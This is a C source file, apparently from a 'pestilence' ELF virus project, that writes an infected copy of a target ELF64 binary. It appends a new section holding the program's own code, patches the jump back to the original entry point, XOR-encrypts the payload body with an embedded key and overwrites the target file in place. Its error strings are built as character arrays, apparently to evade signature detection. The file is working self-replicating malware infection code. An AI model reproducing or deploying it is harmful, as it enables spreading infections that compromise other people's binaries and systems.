#include "pestilence.h"

bool	save_new_section(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *shdr_last) {
	char *bytecode = woody->bin_map + woody->bin_st.st_size;

	ft_memcpy(bytecode, woody_mod, BYTECODE_SIZE);
	bytecode[BYTECODE_SIZE - 1] = '\0'; // to copy woody, not useful

	// Padding for BSS section
	if (shdr_last->sh_type == SHT_NOBITS) {
		size_t size_to_write = shdr_last->sh_size + woody->shdr_last_offset_adjustment;
		char padding_zero[4096];
		ft_memset(padding_zero, 0, sizeof(padding_zero));
		while (true) {
			if (size_to_write / sizeof(padding_zero) < 1) {
				if (syscall_wrapper(__NR_write, new_bin_fd, padding_zero, size_to_write) == -1) {
					ERROR_SYS(((char []){'w','r','i','t','e','1','\0'}));
					return false;
				}
				break ;
			}
			if (syscall_wrapper(__NR_write, new_bin_fd, padding_zero, sizeof(padding_zero)) == -1) {
				ERROR_SYS(((char []){'w','r','i','t','e','2','\0'}));
				return false;
			}
			size_to_write -= sizeof(padding_zero);
		}
	}

	void *addr_pattern;
	// Write old entry
	addr_pattern = find_pattern_uint8((void *)bytecode, BYTECODE_UNPACKER_SIZE, PATTERN_ENTRY_OLD, PATTERN_ENTRY_OLD_SIZE_OPCODE);
	if (!addr_pattern) {
		ERROR(((char []){'o','l','d',' ','e','n','t','r','y',' ','p','a','t','t','e','r','n',' ','n','o','t',' ','f','o','u','n','d','\0'}));
		return false;
	}
	*(int32_t *)addr_pattern = woody->ehdr.e_entry - (woody->new_entry  + (size_t)(addr_pattern - (void *)bytecode) + sizeof(PATTERN_ENTRY_OLD));

	// Write key size for xor_cipher
	addr_pattern = find_pattern_uint16((void *)bytecode, BYTECODE_UNPACKER_SIZE, PATTERN_KEY_SIZE, PATTERN_KEY_SIZE_OPCODE);
	if (!addr_pattern) {
		ERROR(((char []){'k','e','y',' ','s','i','z','e',' ','p','a','t','t','e','r','n',' ','n','o','t',' ','f','o','u','n','d','\0'}));
		return false;
	}
	*(uint64_t *)addr_pattern = woody->key.length;

	// Write text section size for xor_cipher
	Elf64_Shdr	shdr_text;
	uint16_t	index_shdr_text;
	index_shdr_text = get_index_section_with_name(woody, (char []){'.','t','e','x','t','\0'});
	if (index_shdr_text == (uint16_t)-1) {
		ERROR(((char []){'.','t','e','x','t',' ','s','e','c','t','i','o','n',' ','n','o','t',' ','f','o','u','n','d','\0'}));
		return false;
	}
	if (!read_section_header(woody, index_shdr_text, &shdr_text))
		return false;
	addr_pattern = find_pattern_uint16((void *)bytecode, BYTECODE_UNPACKER_SIZE, PATTERN_TEXT_SIZE, PATTERN_TEXT_SIZE_OPCODE);
	if (!addr_pattern) {
		ERROR(((char []){'.','t','e','x','t',' ','s','i','z','e',' ','p','a','t','t','e','r','n',' ','n','o','t',' ','f','o','u','n','d','\0'}));
		return false;
	}
	*(uint64_t *)addr_pattern = BYTECODE_SIZE - BYTECODE_UNPACKER_SIZE;

	xor_cipher(woody->key.raw, woody->key.length, bytecode + BYTECODE_UNPACKER_SIZE - 1, BYTECODE_SIZE - BYTECODE_UNPACKER_SIZE);

	// write key
	ft_memcpy(bytecode + (key_loc - woody_mod), woody->key.raw, woody->key.length);

	// Write instructions
	if (syscall_wrapper(__NR_write, new_bin_fd, bytecode, BYTECODE_SIZE) == -1) {
		ERROR_SYS(((char []){'w','r','i','t','e','3','\0'}));
		return false;
	}
	return true;
}

/*
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|            NEW SECTION            |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

	+-----------------------------------+
	|                                   |
	|       padding (if necessary)      |
	|                                   |
	|- - - - - - - - - - - - - - - - - -|
	|                                   |
	| unpacker.s (sign/key at the end)  |
	|                                   |
	|-----------------------------------| <-----\
	|                                   |       |
	|             syscall.s             |       |
	|                                   |       |
	|-----------------------------------|       +----- xor encrypted part
	|                                   |       |
	|    c functions (without _start)   |       |
	|                                   |       |
	|- - - - - - - - - - - - - - - - - -| <-----/
	|                                   |
	|  _start (only in original binary) |
	|                                   |
	+-----------------------------------+
*/

bool	save_new_shdr(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *new_section) {
	write_uint32(woody, &new_section->sh_type, new_section->sh_type);
	write_uint64(woody, &new_section->sh_flags, new_section->sh_flags);
	write_uint64(woody, &new_section->sh_addr, new_section->sh_addr);
	write_uint64(woody, &new_section->sh_offset, new_section->sh_offset);
	write_uint64(woody, &new_section->sh_size, new_section->sh_size);
	write_uint64(woody, &new_section->sh_addralign, new_section->sh_addralign);

	if (syscall_wrapper(__NR_write, new_bin_fd, new_section, sizeof(Elf64_Shdr)) == -1) {
		ERROR_SYS(((char []){'w','r','i','t','e','5','\0'}));
		return false;
	}
	return true;
}

bool	save_new_elf_file(struct s_woody *woody, Elf64_Shdr *shdr_last, uint16_t index_shdr_last) {
	int	new_bin_fd;
	size_t	written_map_bytes = 0;

	new_bin_fd = syscall_wrapper(__NR_open, woody->target, O_WRONLY | O_TRUNC, woody->bin_st.st_mode);
	if (new_bin_fd == -1) {
		ERROR_SYS(((char []){'o','p','e','n','\0'}));
		return false;
	}

	size_t size_to_write_before_decrypter = shdr_last->sh_offset - woody->shdr_last_offset_adjustment + (shdr_last->sh_type != SHT_NOBITS ? shdr_last->sh_size : 0);
	if (syscall_wrapper(__NR_write, new_bin_fd, woody->bin_map, size_to_write_before_decrypter) == -1) { // FIRST PART
		ERROR_SYS(((char []){'w','r','i','t','e','6','\0'}));
		return false;
	}
	written_map_bytes += size_to_write_before_decrypter;
	if (!save_new_section(woody, new_bin_fd, shdr_last)) // Write new section + .bss padding
		return false;
	size_t size_to_write_before_new_shdr = (woody->ehdr.e_shoff + woody->ehdr.e_shentsize * (index_shdr_last + 1)) - written_map_bytes;
	if (syscall_wrapper(__NR_write, new_bin_fd, woody->bin_map + written_map_bytes, size_to_write_before_new_shdr) == -1) { // SECOND PART
		ERROR_SYS(((char []){'w','r','i','t','e','7','\0'}));
		return false;
	}
	written_map_bytes += size_to_write_before_new_shdr;
	if (!save_new_shdr(woody, new_bin_fd, &woody->new_section)) // Write new shdr
		return false;
	if (syscall_wrapper(__NR_write, new_bin_fd, woody->bin_map + written_map_bytes, woody->bin_st.st_size - written_map_bytes) == -1) { // THIRD PART
		ERROR_SYS(((char []){'w','r','i','t','e','8','\0'}));
		return false;
	}
	syscall_wrapper(__NR_close, new_bin_fd);
	return true;
}
